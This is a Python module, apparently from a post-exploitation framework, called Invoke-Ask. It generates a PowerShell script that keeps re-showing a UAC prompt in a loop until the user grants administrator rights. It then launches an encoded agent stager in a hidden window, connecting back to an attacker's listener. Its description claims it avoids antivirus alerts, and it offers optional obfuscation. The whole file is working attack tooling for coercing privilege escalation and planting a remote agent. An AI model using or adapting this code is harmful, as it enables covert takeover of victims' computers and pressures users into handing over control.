from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {   
            'Name': 'Invoke-Ask',
                
            'Author': ['Jack64'],
                                              
            'Description': ("Leverages Start-Process' -Verb runAs option inside a"               
                            " YES-Required loop to prompt the user for a high integrity context before running the agent code."
                            " UAC will report Powershell is requesting Administrator privileges."
                            " Because this does not use the BypassUAC DLLs, it should not trigger any AV alerts."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ask.rb'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            } 
        }
        
        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        listenerName = self.options['Listener']['Value']

        # staging options
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']


        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)

            if launcher == "":
                print helpers.color("[!] Error in launcher generation.")
                return ""
            else:
                encLauncher = " ".join(launcher.split(" ")[1:])

                script = '''
if( ($(whoami /groups) -like "*S-1-5-32-544*").length -eq 1) {
    while($True) {
        try {
            Start-Process "powershell" -ArgumentList "%s" -Verb runAs -WindowStyle hidden
            "[*] Successfully elevated!"
            break
        }
        catch {}
    }
}
else  {
    "[!] User is not a local administrator!"
}
''' %(encLauncher)
                if obfuscate:
                    script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
                return script
